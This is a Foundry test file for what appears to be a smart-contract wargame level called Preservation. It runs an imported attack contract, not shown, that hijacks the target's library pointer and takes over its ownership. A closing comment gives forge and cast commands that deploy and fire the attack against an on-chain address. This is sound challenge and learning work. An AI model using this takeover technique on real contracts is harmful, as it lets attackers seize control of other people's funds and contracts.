// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";
import {PreservationAttack} from "../solutions/PreservationAttack.sol";

contract PreservationTest is Test {
    Preservation public preservation;
    LibraryContract public lib1;
    LibraryContract public lib2;
    PreservationAttack public attackContract;
    address public attacker;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");

        lib1 = new LibraryContract();
        lib2 = new LibraryContract();

        vm.prank(owner);
        preservation = new Preservation(address(lib1), address(lib2));
    }

    function test_changeOwner() public {
        vm.startPrank(attacker);

        attackContract = new PreservationAttack(address(preservation));
        attackContract.attack();

        // change preservation's timeZone1Library to attackContract
        assertEq(preservation.timeZone1Library(), address(attackContract));

        assertEq(
            preservation.owner(),
            0x7bB341488d5E6838Bb9C1fD521543f83066Dc9Bd
        );

        vm.stopPrank();
    }
}

/*
source .env
export preservation=0x5d1712c264329FBEeaA98aF3271d55cD73f49965

forge create solutions/PreservationAttack.sol:PreservationAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $preservation

export attack=0xad4596A2C58246032a86D36bCb2804b32d6D1ee5

cast call $preservation "timeZone1Library()" --rpc-url $RPC_URL
cast call $preservation "timeZone2Library()" --rpc-url $RPC_URL
cast call $preservation "owner()" --rpc-url $RPC_URL

cast send $attack "attack()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
